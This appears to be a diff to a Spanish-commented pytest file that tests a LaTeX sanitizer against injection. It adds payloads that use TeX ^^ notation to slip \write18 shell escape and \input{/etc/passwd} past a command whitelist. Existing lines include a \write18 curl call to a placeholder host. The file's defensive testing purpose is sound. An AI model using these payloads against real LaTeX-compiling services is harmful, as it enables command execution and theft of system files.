@@ -36,6 +36,12 @@ ATAQUES = [
     r"\openout1=/tmp/robado.txt",
     r"\catcode`\@=11",
     r"\immediate\write18{curl http://malo.example}",
+    # Notacion ^^ de TeX: el comando se construye sin escribir su nombre, asi
+    # que la lista blanca de comandos no lo ve. Encontrado el 2026-07-25 y
+    # verificado compilando: `\^^73ection{X}` produjo una seccion real (D32).
+    r"\^^77rite18{ls}",
+    r"\^^69nput{/etc/passwd}",
+    r"\^^^^0077rite18{ls}",
 ]
 
 
@@ -47,6 +53,9 @@ def test_un_ataque_en_una_ecuacion_no_llega_al_tex(ataque):
     assert r"\openout" not in tex
     assert r"\csname" not in tex
     assert r"\def\x" not in tex
+    # Ningun fragmento con notacion ^^ llega vivo al .tex: si el atacante la
+    # uso, el bloque se degrado y los acentos salieron escapados.
+    assert "^^" not in tex
 
 
 @pytest.mark.parametrize("ataque", ATAQUES)
